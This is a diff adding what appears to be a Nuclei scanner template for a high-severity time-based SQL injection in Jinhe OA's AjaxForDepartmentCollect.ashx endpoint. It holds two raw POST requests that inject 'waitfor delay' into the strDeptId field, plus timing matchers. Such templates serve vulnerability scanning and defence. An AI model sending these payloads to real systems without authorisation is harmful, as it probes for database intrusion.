@@ -1,0 +1,33 @@
+id: jinheOA-AjaxForDepartmentCollect-sql
+
+info:
+  name: 金和OA AjaxForDepartmentCollect.ashx 存在SQL注入漏洞
+  author: jinheOA
+  severity: high
+  tags: jinheOA
+
+http:
+  - raw:
+      - |
+        POST /c6/JHSoft.Web.CostControl/Collect/AjaxForDepartmentCollect.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Content-Type: application/x-www-form-urlencoded
+
+        strType=getHistoryList&strDeptId=1; waitfor delay'0:0:2'--&strCollectType=Department&strYear=2012
+
+      - |
+        POST /c6/JHSoft.Web.CostControl/Collect/AjaxForDepartmentCollect.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Content-Type: application/x-www-form-urlencoded
+
+        strType=getHistoryList&strDeptId=1; waitfor delay'0:0:4'--&strCollectType=Department&strYear=2012
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=2 && duration_1<4'  
+          - 'duration_2>=4 && duration_2<6'
+        condition: and
+
